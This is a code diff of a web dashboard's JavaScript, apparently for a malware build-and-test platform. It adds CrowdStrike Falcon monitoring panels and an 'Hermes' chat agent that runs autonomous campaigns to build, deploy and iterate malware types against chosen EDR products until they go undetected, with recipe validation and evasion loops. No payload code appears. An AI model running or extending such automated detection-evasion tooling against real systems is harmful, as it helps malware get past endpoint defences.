-    const a = parseInt(document.getElementById('chunk-max-algo')?.value || '0');
-    const l = parseInt(document.getElementById('chunk-max-llm')?.value || '0');
-    const c = parseInt(document.getElementById('chunk-max-cloud')?.value || '0');
-    const el = document.getElementById('chunk-total-runs');
-    if (el) el.textContent = a + l + c;
-  }
-  ['chunk-max-algo','chunk-max-llm','chunk-max-cloud'].forEach(id => {
-    document.getElementById(id)?.addEventListener('input', updateTotalRuns);
-  });
   // Load layers when the Advanced section is opened (not before)
   const details = document.querySelector('details');
   if (details) {
@@ -1658,9 +1645,8 @@ const CHUNK_FIELDS = [
   {id:'chunk-deploy', type:'chk'},
   {id:'chunk-obfuscation', type:'val'},
   {id:'chunk-adaptive', type:'chk'},
-  {id:'chunk-max-algo', type:'val'},
-  {id:'chunk-max-llm', type:'val'},
-  {id:'chunk-max-cloud', type:'val'},
+  {id:'chunk-max-rounds', type:'val'},
+  {id:'chunk-use-sim', type:'chk'},
   {id:'chunk-llm-url', type:'val'},
   {id:'chunk-llm-model', type:'val'},
 ];
@@ -1703,7 +1689,7 @@ async function refreshChunkEdrs() {
   try {
     const r = await fetch('/api/edr/manage/status');
     _chunkEdrState = await r.json();
-    const order = ['defender', 'sysmon', 'wazuh'];
+    const order = ['defender', 'crowdstrike', 'sysmon', 'wazuh'];
     let h = '';
     for (const key of order) {
       const edr = _chunkEdrState[key];
@@ -1872,9 +1858,9 @@ async function chunkBuild() {
   const adaptive = document.getElementById('chunk-adaptive')?.checked ?? false;
   const deploy = document.getElementById('chunk-deploy')?.checked ?? true;
   const activeEdrs = getActiveChunkEdrs();
-  const maxAlgo = parseInt(document.getElementById('chunk-max-algo')?.value || '5');
-  const maxLlm = parseInt(document.getElementById('chunk-max-llm')?.value || '3');
-  const maxCloud = parseInt(document.getElementById('chunk-max-cloud')?.value || '2');
+  const maxRounds = parseInt(document.getElementById('chunk-max-rounds')?.value || '50');
+  const batchSize = parseInt(document.getElementById('chunk-batch-size')?.value || '3');
+  const useSim = document.getElementById('chunk-use-sim')?.checked ?? false;
   const obfuscation = document.getElementById('chunk-obfuscation')?.value || 'heavy';
   const llm_url = document.getElementById('chunk-llm-url')?.value || '';
   const llm_model = document.getElementById('chunk-llm-model')?.value || '';
@@ -1901,7 +1887,7 @@ async function chunkBuild() {
       const r = await fetch('/api/chunk/hybrid', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({malware_type, dry_run: false, active_edrs: activeEdrs, max_algorithmic: maxAlgo, max_llm: maxLlm, max_cloud: maxCloud, obfuscation, llm_url, llm_model}),
+        body: JSON.stringify({malware_type, dry_run: false, use_sim: useSim, active_edrs: activeEdrs, max_rounds: maxRounds, batch_size: batchSize, obfuscation, llm_url, llm_model, vm_port, vm_user, vm_pass, c2_port}),
       });
       if (!r.ok) {
         const txt = await r.text();
@@ -1909,7 +1895,7 @@ async function chunkBuild() {
         return;
       }
       const {job_id, cmd_str} = await r.json();
-      activeJobCmd = 'chunk';
+      activeJobCmd = 'build';
       openJob(job_id, cmd_str, true);
     } catch(e) { flashError(`Hybrid loop failed: ${e}`); }
     return;
@@ -1933,7 +1919,7 @@ async function chunkBuild() {
       return;
     }
     const {job_id, cmd_str} = await r.json();
-    activeJobCmd = 'chunk';
+    activeJobCmd = 'build';
     openJob(job_id, cmd_str, true);
   } catch(e) {
     flashError(`Build failed: ${e}`);
@@ -2019,6 +2005,20 @@ async function refreshDetectionStatus() {
     }
     h += '</div>';
 
+    // CrowdStrike Falcon
+    if (s.crowdstrike) {
+      h += `<div>${dot(s.crowdstrike.online)}CrowdStrike Falcon: ${s.crowdstrike.online ? 'online' : 'offline'}`;
+      if (s.crowdstrike.online) {
+        const svc = s.crowdstrike.service;
+        const drv = s.crowdstrike.driver;
+        h += ` <span style="color:var(--${svc && drv ? 'green' : 'yellow'})">(`;
+        h += svc ? 'service ON' : '<b>service OFF</b>';
+        h += drv ? ', driver ON' : ', <b>driver OFF</b>';
+        h += ')</span>';
+      }
+      h += '</div>';
+    }
+
     panel.innerHTML = h;
   } catch(e) {
     panel.innerHTML = '<span style="color:var(--red)">Could not check detection status</span>';
@@ -2045,6 +2045,14 @@ async function refreshDetectionAlerts() {
       h += '<span style="color:var(--green)">DEFENDER: 0 threats</span> ';
     }
     h += '&nbsp;|&nbsp;';
+    if (sum.crowdstrike_warnings > 0) {
+      h += `<span style="color:var(--red);font-weight:700">FALCON: ${sum.crowdstrike_warnings} alert(s)</span> `;
+    } else if (sum.crowdstrike_total > 0) {
+      h += `<span style="color:var(--yellow)">FALCON: ${sum.crowdstrike_total} event(s)</span> `;
+    } else {
+      h += '<span style="color:var(--green)">FALCON: clean</span> ';
+    }
+    h += '&nbsp;|&nbsp;';
     if (sum.wazuh_high > 0) {
       h += `<span style="color:var(--red);font-weight:700">WAZUH: ${sum.wazuh_high} high</span>`;
     } else if (sum.wazuh_medium > 0) {
@@ -2068,6 +2076,21 @@ async function refreshDetectionAlerts() {
       });
     }
 
+    // CrowdStrike Falcon events
+    if (data.crowdstrike && data.crowdstrike.length > 0) {
+      h += '<div style="color:var(--purple);font-weight:700;font-size:10px;margin:6px 0 4px">CROWDSTRIKE FALCON</div>';
+      data.crowdstrike.forEach(ev => {
+        const isWarn = ['Warning','Error','Critical'].includes(ev.level);
+        const color = isWarn ? 'var(--red)' : 'var(--muted)';
+        h += '<div style="padding:3px 4px;background:rgba(176,125,255,0.06);border-radius:3px;margin-bottom:2px">';
+        h += `<span style="color:${color};font-weight:600">${ev.level || 'INFO'}</span> `;
+        h += `<span style="color:var(--muted)">[${ev.event_id}]</span> `;
+        const msg = (ev.message || '').length > 80 ? ev.message.substring(0, 80) + '...' : ev.message;
+        h += msg;
+        h += '</div>';
+      });
+    }
+
     // Wazuh alerts
     if (data.wazuh && data.wazuh.length > 0) {
       h += '<div style="font-weight:700;font-size:10px;margin:6px 0 4px">WAZUH ALERTS</div>';
@@ -2087,7 +2110,7 @@ async function refreshDetectionAlerts() {
       });
     }
 
-    if (!data.wazuh?.length && !data.defender?.length) {
+    if (!data.wazuh?.length && !data.defender?.length && !data.crowdstrike?.length) {
       h += '<div style="color:var(--green);padding:4px 0">No alerts in the last ' + minutes + ' minutes</div>';
     }
 
@@ -2425,7 +2448,7 @@ async function refreshEdrMgmt() {
   try {
     const r = await fetch('/api/edr/manage/status');
     const data = await r.json();
-    const order = ['defender', 'sysmon', 'wazuh', 'wazuh_indexer'];
+    const order = ['defender', 'crowdstrike', 'sysmon', 'wazuh', 'wazuh_indexer'];
     let h = '';
     for (const key of order) {
       const edr = data[key];
@@ -2562,15 +2585,567 @@ window.openJob = function(jobId, cmdStr, fresh) {
   _origOpenJob(jobId, cmdStr, fresh);
 };
 
-renderForm('run');
-// restoreFormState called inside renderForm; pickMode already called there via restoreFormState
-// fallback: ensure initial state if nothing was saved
-if (!localStorage.getItem('mgf_state_run')) pickMode('local-run');
 refreshResults();
 initJobs();
 refreshC2Status();
 setInterval(refreshResults, 15000);
 setInterval(refreshC2Status, 5000);
+
+// ── Hermes Multi-Session Chat ──
+const hermesChat = document.getElementById('hermes-chat');
+const chatMessages = document.getElementById('chat-messages');
+const chatInput = document.getElementById('chat-input');
+const chatSend = document.getElementById('chat-send');
+const hermesDot = document.getElementById('hermes-dot');
+const hermesStatusText = document.getElementById('hermes-status-text');
+const hermesRound = document.getElementById('hermes-round');
+const hermesStopBtn = document.getElementById('hermes-stop-btn');
+const formArea = document.getElementById('form-area');
+const runWrap = document.querySelector('.run-wrap');
+
+let hermesWs = null;
+let hermesThinking = false;
+let hermesActiveSessionId = null;
+let hermesSessions = [];
+let hermesReplaying = false;
+let hermesStreamDiv = null;
+
+function setHermesRunning(running) {
+  hermesStopBtn.style.display = running ? '' : 'none';
+}
+
+function addChatMsg(role, text, toolName, skipScroll) {
+  const div = document.createElement('div');
+  div.className = 'chat-msg ' + role;
+  if (role === 'tool' && toolName) {
+    div.innerHTML = '<div class="tool-name">' + escHtml(toolName) + '</div><pre>' + escHtml(text) + '</pre>';
+  } else {
+    div.textContent = text;
+  }
+  chatMessages.appendChild(div);
+  if (!skipScroll) chatMessages.scrollTop = chatMessages.scrollHeight;
+  return div;
+}
+
+function appendStreamText(text, skipScroll) {
+  if (!hermesStreamDiv) {
+    hermesStreamDiv = document.createElement('div');
+    hermesStreamDiv.className = 'chat-msg hermes';
+    chatMessages.appendChild(hermesStreamDiv);
+  }
+  hermesStreamDiv.textContent += text;
+  if (!skipScroll) chatMessages.scrollTop = chatMessages.scrollHeight;
+}
+
+function finalizeStream() {
+  hermesStreamDiv = null;
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ── Session list management ──
+
+async function hermesFetchSessions() {
+  try {
+    const r = await fetch('/api/hermes/sessions');
+    hermesSessions = await r.json();
+    renderSessionList();
+  } catch(e) {
+    console.error('Failed to fetch sessions:', e);
+  }
+}
+
+function renderSessionList() {
+  if (activeCmd !== 'hermes') return;
+  formArea.innerHTML = '';
+  if (!hermesSessions.length) {
+    formArea.innerHTML = '<div style="padding:12px;color:var(--muted);font-size:11px;text-align:center">No sessions yet</div>';
+    return;
+  }
+  hermesSessions.forEach(s => {
+    const item = document.createElement('div');
+    item.className = 'hermes-session-item' + (s.id === hermesActiveSessionId ? ' active' : '');
+    item.dataset.sid = s.id;
+
+    const dotClass = s.status === 'thinking' ? 'thinking' : (s.message_count > 0 ? 'ready' : '');
+    const timeStr = s.created_at ? new Date(s.created_at).toLocaleDateString(undefined, {month:'short', day:'numeric'}) : '';
+    const msgCount = s.message_count || 0;
+
+    item.innerHTML = `
+      <span class="session-dot ${dotClass}"></span>
+      <div class="session-info" style="flex:1;min-width:0;display:flex;flex-direction:column;gap:2px">
+        <div class="hermes-session-title">${escHtml(s.title || 'New chat')}</div>
+        <div class="hermes-session-meta">${timeStr}${msgCount ? ' · ' + msgCount + ' msgs' : ''}</div>
+      </div>
+      <button class="hermes-session-del" onclick="event.stopPropagation();hermesDeleteSession('${s.id}')" title="Delete">×</button>
+    `;
+    item.addEventListener('click', () => hermesSwitchSession(s.id));
+    formArea.appendChild(item);
+  });
+}
+
+async function hermesNewSession() {
+  try {
+    const config = {
+      edr: document.getElementById('hermes-edr').value,
+      malware_type: document.getElementById('hermes-type').value,
+    };
+    const r = await fetch('/api/hermes/sessions', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({config}),
+    });
+    const session = await r.json();
+    hermesActiveSessionId = session.id;
+    localStorage.setItem('hermes_active_session', session.id);
+    await hermesFetchSessions();
+    hermesConnectSession(session.id);
+  } catch(e) {
+    console.error('Failed to create session:', e);
+  }
+}
+
+async function hermesDeleteSession(sid) {
+  if (!confirm('Delete this session?')) return;
+  try {
+    await fetch('/api/hermes/sessions/' + sid, {method: 'DELETE'});
+    if (hermesActiveSessionId === sid) {
+      hermesDisconnect();
+      hermesActiveSessionId = null;
+      chatMessages.innerHTML = '<div class="chat-msg system">Session deleted. Create a new one to continue.</div>';
+    }
+    await hermesFetchSessions();
+    if (!hermesActiveSessionId && hermesSessions.length) {
+      hermesSwitchSession(hermesSessions[0].id);
+    }
+  } catch(e) {
+    console.error('Failed to delete session:', e);
+  }
+}
+
+function hermesSwitchSession(sid) {
+  if (sid === hermesActiveSessionId && hermesWs && hermesWs.readyState <= 1) return;
+  hermesActiveSessionId = sid;
+  localStorage.setItem('hermes_active_session', sid);
+  renderSessionList();
+  hermesConnectSession(sid);
+}
+
+// ── WebSocket connection per session ──
+
+function hermesDisconnect() {
+  if (hermesWs) {
+    hermesWs.close();
+    hermesWs = null;
+  }
+  hermesThinking = false;
+  chatSend.disabled = false;
+  setHermesRunning(false);
+}
+
+function hermesConnectSession(sid) {
+  hermesDisconnect();
+  chatMessages.innerHTML = '';
+  hermesDot.className = 'hermes-dot';
+  hermesStatusText.textContent = 'Hermes — connecting...';
+
+  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  hermesWs = new WebSocket(proto + '//' + location.host + '/ws/hermes/' + sid);
+  hermesReplaying = false;
+
+  hermesWs.onopen = () => {
+    hermesDot.className = 'hermes-dot connected';
+    hermesStatusText.textContent = 'Hermes — connected';
+  };
+
+  hermesWs.onclose = () => {
+    hermesDot.className = 'hermes-dot';
+    hermesStatusText.textContent = 'Hermes — disconnected';
+    hermesThinking = false;
+    chatSend.disabled = false;
+    setHermesRunning(false);
+  };
+
+  hermesWs.onmessage = (ev) => {
+    try {
+      const msg = JSON.parse(ev.data);
+
+      if (msg.type === 'replay_start') {
+        hermesReplaying = true;
+        chatMessages.innerHTML = '';
+        return;
+      }
+      if (msg.type === 'replay_end') {
+        hermesReplaying = false;
+        chatMessages.scrollTop = chatMessages.scrollHeight;
+        if (msg.status === 'thinking') {
+          hermesThinking = true;
+          hermesDot.className = 'hermes-dot thinking';
+          hermesStatusText.textContent = 'Hermes — thinking...';
+          chatSend.disabled = true;
+          setHermesRunning(true);
+        } else {
+          hermesDot.className = 'hermes-dot connected';
+          hermesStatusText.textContent = 'Hermes — ready';
+        }
+        if (msg.title) {
+          updateSessionTitle(hermesActiveSessionId, msg.title);
+        }
+        return;
+      }
+
+      if (msg.type === 'session_title') {
+        updateSessionTitle(hermesActiveSessionId, msg.title);
+        return;
+      }
+
+      const skipScroll = hermesReplaying;
+
+      if (msg.type === 'user_message') {
+        finalizeStream();
+        addChatMsg('user', msg.content, null, skipScroll);
+      } else if (msg.type === 'text') {
+        const content = msg.content || '';
+        if (content) appendStreamText(content, skipScroll);
+        if (!hermesReplaying) {
+          hermesThinking = false;
+          hermesDot.className = 'hermes-dot connected';
+          hermesStatusText.textContent = 'Hermes — streaming';
+        }
+      } else if (msg.type === 'tool_call') {
+        finalizeStream();
+        const args = msg.args ? JSON.stringify(msg.args) : '';
+        addChatMsg('tool', args, '\u{1F527} ' + (msg.name || '?'), skipScroll);
+        if (!hermesReplaying) {
+          hermesStatusText.textContent = 'Hermes — ' + (msg.name || 'tool');
+        }
+      } else if (msg.type === 'tool_result') {
+        addChatMsg('tool', msg.result || '', '✅ ' + (msg.name || '?'), skipScroll);
+      } else if (msg.type === 'round_start') {
+        finalizeStream();
+        addChatMsg('system', 'Round ' + msg.round + '/' + msg.max_rounds, null, skipScroll);
+        if (!hermesReplaying) {
+          hermesRound.textContent = 'round ' + msg.round + '/' + msg.max_rounds;
+        }
+      } else if (msg.type === 'campaign_success') {
+        finalizeStream();
+        addChatMsg('system', '\u{1F389} Campaign SUCCESS at round ' + (msg.round || '?'), null, skipScroll);
+        if (!hermesReplaying) {
+          hermesDot.className = 'hermes-dot connected';
+          hermesStatusText.textContent = 'Hermes — SUCCESS';
+          setHermesRunning(false);
+        }
+      } else if (msg.type === 'thinking') {
+        finalizeStream();
+        if (!hermesReplaying) {
+          hermesDot.className = 'hermes-dot thinking';
+          hermesStatusText.textContent = 'Hermes — thinking...';
+          setHermesRunning(true);
+        }
+      } else if (msg.type === 'status') {
+        if (!hermesReplaying) {
+          hermesStatusText.textContent = 'Hermes — ' + (msg.content || msg.kind || '');
+          if (msg.round) hermesRound.textContent = 'round ' + msg.round;
+        }
+      } else if (msg.type === 'error') {
+        finalizeStream();
+        addChatMsg('system', 'Error: ' + (msg.content || 'Unknown error'), null, skipScroll);
+        if (!hermesReplaying) {
+          hermesThinking = false;
+          chatSend.disabled = false;
+          setHermesRunning(false);
+        }
+      } else if (msg.type === 'complete') {
+        finalizeStream();
+        addChatMsg('system', msg.content || 'Session complete.', null, skipScroll);
+        if (!hermesReplaying) {
+          hermesThinking = false;
+          hermesDot.className = 'hermes-dot connected';
+          hermesStatusText.textContent = 'Hermes — complete';
+          chatSend.disabled = false;
+          setHermesRunning(false);
+        }
+      }
+    } catch(e) {
+      addChatMsg('hermes', ev.data);
+    }
+  };
+}
+
+function updateSessionTitle(sid, title) {
+  const item = hermesSessions.find(s => s.id === sid);
+  if (item) {
+    item.title = title;
+    renderSessionList();
+  }
+}
+
+// ── Send messages ──
+
+function sendHermesMsg(text) {
+  if (!hermesActiveSessionId) {
+    hermesNewSession().then(() => {
+      setTimeout(() => sendHermesMsg(text), 800);
+    });
+    return;
+  }
+  if (!hermesWs || hermesWs.readyState !== 1) {
+    hermesConnectSession(hermesActiveSessionId);
+    setTimeout(() => sendHermesMsg(text), 500);
+    return;
+  }
+  addChatMsg('user', text);
+  hermesThinking = true;
+  chatSend.disabled = true;
+  hermesDot.className = 'hermes-dot thinking';
+  hermesStatusText.textContent = 'Hermes — thinking...';
+  setHermesRunning(true);
+  hermesWs.send(JSON.stringify({
+    type: 'chat',
+    content: text,
+    config: {
+      edr: document.getElementById('hermes-edr').value,
+      malware_type: document.getElementById('hermes-type').value,
+      format: document.getElementById('hermes-format').value,
+    }
+  }));
+  chatInput.value = '';
+  chatInput.style.height = 'auto';
+}
+
+// ── Stop button ──
+hermesStopBtn.addEventListener('click', () => {
+  if (hermesWs && hermesWs.readyState === 1) {
+    hermesWs.send(JSON.stringify({type: 'stop'}));
+    addChatMsg('system', 'Stopped by user.');
+  }
+  hermesThinking = false;
+  chatSend.disabled = false;
+  hermesDot.className = 'hermes-dot connected';
+  hermesStatusText.textContent = 'Hermes — stopped';
+  setHermesRunning(false);
+});
+
+// ── Input handlers ──
+chatSend.addEventListener('click', () => {
+  const text = chatInput.value.trim();
+  if (text) sendHermesMsg(text);
+});
+
+chatInput.addEventListener('keydown', (ev) => {
+  if (ev.key === 'Enter' && !ev.shiftKey) {
+    ev.preventDefault();
+    const text = chatInput.value.trim();
+    if (text) sendHermesMsg(text);
+  }
+});
+
+chatInput.addEventListener('input', () => {
+  chatInput.style.height = 'auto';
+  chatInput.style.height = Math.min(chatInput.scrollHeight, 120) + 'px';
+});
+
+// ── Sidebar content for Hermes tab ──
+let savedFormContent = null;
+let savedRunContent = null;
+
+function enterHermesTab() {
+  savedFormContent = formArea.innerHTML;
+  savedRunContent = runWrap.innerHTML;
+  renderSessionList();
+  formArea.style.display = '';
+  runWrap.innerHTML = '<button class="run-btn" id="hermes-new-btn" style="flex:1" onclick="hermesNewSession()">+ New Chat</button>'
+    + '<button class="run-btn" id="hermes-auto-sidebar-btn" style="width:90px" onclick="hermesAutoRun()">&#9654; Auto</button>'
+    + '<div style="display:flex;gap:6px;margin-top:4px;width:100%">'
+    + '<button class="run-btn" style="flex:1;font-size:11px;padding:6px" onclick="hermesValidate()">&#10003; Validate</button>'
+    + '<button class="run-btn" style="flex:1;font-size:11px;padding:6px" onclick="hermesEvadePrompt()">&#9881; Evade</button>'
+    + '</div>';
+  runWrap.style.display = '';
+}
+
+function exitHermesTab() {
+  if (savedFormContent !== null) formArea.innerHTML = savedFormContent;
+  if (savedRunContent !== null) runWrap.innerHTML = savedRunContent;
+  savedFormContent = null;
+  savedRunContent = null;
+}
+
+function hermesAutoRun() {
+  const edr = document.getElementById('hermes-edr').value;
+  const type = document.getElementById('hermes-type').value;
+  const fmt = document.getElementById('hermes-format').value;
+  const fmtStr = fmt === 'auto' ? '' : ' using ' + fmt + ' format';
+  sendHermesMsg('Run autonomous campaign: ' + type + ' against ' + edr + fmtStr + '. Build, deploy, test, and iterate until success.');
+}
+
+async function hermesValidate() {
+  const edr = document.getElementById('hermes-edr').value;
+  const recipesInput = prompt('Recipe names to validate (comma-separated, leave empty for all proven PASS recipes):');
+  if (recipesInput === null) return;
+
+  const recipes = recipesInput.trim() ? recipesInput.split(',').map(r => r.trim()).filter(Boolean) : null;
+
+  addChatMsg('system', 'Starting recipe validation against ' + edr + '...');
+  try {
+    const r = await fetch('/api/hermes/validate', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({edr, recipes}),
+    });
+    const data = await r.json();
+    if (data.error) {
+      addChatMsg('system', 'Error: ' + data.error);
+      return;
+    }
+    addChatMsg('system', 'Validation job started (#' + data.job_id + '). Streaming output below.');
+    hermesChat.classList.remove('active');
+    document.getElementById('term-wrap').style.display = '';
+    document.getElementById('jobs-bar').style.display = '';
+    const rp = document.getElementById('res-pane'); if (rp) rp.style.display = '';
+    addChip(data.job_id, 'running', data.cmd_str);
+    openJob(data.job_id, data.cmd_str, true);
+    hermesWatchValidation(data.job_id);
+  } catch(e) {
+    addChatMsg('system', 'Failed to start validation: ' + e);
+  }
+}
+
+function hermesWatchValidation(jobId) {
+  const poll = setInterval(async () => {
+    try {
+      const r = await fetch('/api/jobs/' + jobId);
+      const job = await r.json();
+      if (job.status === 'success' || job.status === 'failed') {
+        clearInterval(poll);
+        hermesShowValidationReport();
+      }
+    } catch(e) { clearInterval(poll); }
+  }, 3000);
+}
+
+async function hermesShowValidationReport() {
+  try {
+    const r = await fetch('/api/hermes/validation-report');
+    if (!r.ok) {
+      addChatMsg('system', 'No validation report found.');
+      return;
+    }
+    const report = await r.json();
+    const s = report.summary || {};
+    let lines = ['=== Validation Report ===',
+      'EDR: ' + (report.edr || '?'),
+      'Tested: ' + s.total_tested + ' recipes',
+      'Still pass: ' + s.still_pass,
+      'Newly failed: ' + s.newly_failed, ''];
+    if (report.still_working && report.still_working.length) {
+      lines.push('Still working:');
+      report.still_working.forEach(r => lines.push('  + ' + r));
+      lines.push('');
+    }
+    if (report.detected && report.detected.length) {
+      lines.push('Newly detected:');
+      report.detected.forEach(d => {
+        lines.push('  - ' + d.recipe + ': ' + d.verdict);
+        if (d.analysis) lines.push('    ' + d.analysis.split('\n')[0]);
+      });
+    }
+    addChatMsg('system', lines.join('\n'));
+  } catch(e) {
+    addChatMsg('system', 'Failed to load validation report: ' + e);
+  }
+}
+
+async function hermesEvadePrompt() {
+  const edr = document.getElementById('hermes-edr').value;
+  const recipesInput = prompt('Recipe names to evade (comma-separated, required):');
+  if (!recipesInput || !recipesInput.trim()) return;
+
+  const recipes = recipesInput.split(',').map(r => r.trim()).filter(Boolean);
+  if (!recipes.length) { alert('At least one recipe name is required.'); return; }
+
+  addChatMsg('system', 'Starting evasion loop for: ' + recipes.join(', ') + ' against ' + edr);
+  try {
+    const r = await fetch('/api/hermes/evade', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({edr, recipes}),
+    });
+    const data = await r.json();
+    if (data.error) {
+      addChatMsg('system', 'Error: ' + data.error);
+      return;
+    }
+    addChatMsg('system', 'Evasion job started (#' + data.job_id + '). Streaming output below.');
+    hermesChat.classList.remove('active');
+    document.getElementById('term-wrap').style.display = '';
+    document.getElementById('jobs-bar').style.display = '';
+    const rp2 = document.getElementById('res-pane'); if (rp2) rp2.style.display = '';
+    addChip(data.job_id, 'running', data.cmd_str);
+    openJob(data.job_id, data.cmd_str, true);
+  } catch(e) {
+    addChatMsg('system', 'Failed to start evasion loop: ' + e);
+  }
+}
+
+// ── Tab toggle (Hermes view) ──
+document.getElementById('tabs').addEventListener('click', (ev) => {
+  const t = ev.target.closest('.tab');
+  if (!t) return;
+  const cmd = t.dataset.cmd;
+  const termWrap = document.getElementById('term-wrap');
+  const jobsBar = document.getElementById('jobs-bar');
+  const resPaneEl = document.getElementById('res-pane');
+  if (cmd === 'hermes') {
+    hermesChat.classList.add('active');
+    if (termWrap) termWrap.style.display = 'none';
+    if (jobsBar) jobsBar.style.display = 'none';
+    if (resPaneEl) resPaneEl.style.display = 'none';
+    enterHermesTab();
+    if (hermesActiveSessionId && (!hermesWs || hermesWs.readyState > 1)) {
+      hermesConnectSession(hermesActiveSessionId);
+    }
+  } else {
+    hermesChat.classList.remove('active');
+    exitHermesTab();
+    if (termWrap) termWrap.style.display = '';
+    if (jobsBar) jobsBar.style.display = '';
+    if (resPaneEl) resPaneEl.style.display = '';
+    formArea.style.display = '';
+    runWrap.style.display = '';
+  }
+});
+
+// ── Boot into Hermes ──
+async function hermesInit() {
+  await hermesFetchSessions();
+
+  const lastSid = localStorage.getItem('hermes_active_session');
+  const lastExists = lastSid && hermesSessions.find(s => s.id === lastSid);
+
+  if (lastExists) {
+    hermesActiveSessionId = lastSid;
+    renderSessionList();
+    hermesConnectSession(lastSid);
+  } else if (hermesSessions.length > 0) {
+    hermesActiveSessionId = hermesSessions[0].id;
+    localStorage.setItem('hermes_active_session', hermesActiveSessionId);
+    renderSessionList();
+    hermesConnectSession(hermesSessions[0].id);
+  } else {
+    await hermesNewSession();
+  }
+}
+
+hermesChat.classList.add('active');
+document.getElementById('term-wrap').style.display = 'none';
+document.getElementById('jobs-bar').style.display = 'none';
+const _resPane = document.getElementById('res-pane');
+if (_resPane) _resPane.style.display = 'none';
+activeCmd = 'hermes';
+enterHermesTab();
+hermesInit();
 </script>
 </body>
 </html>
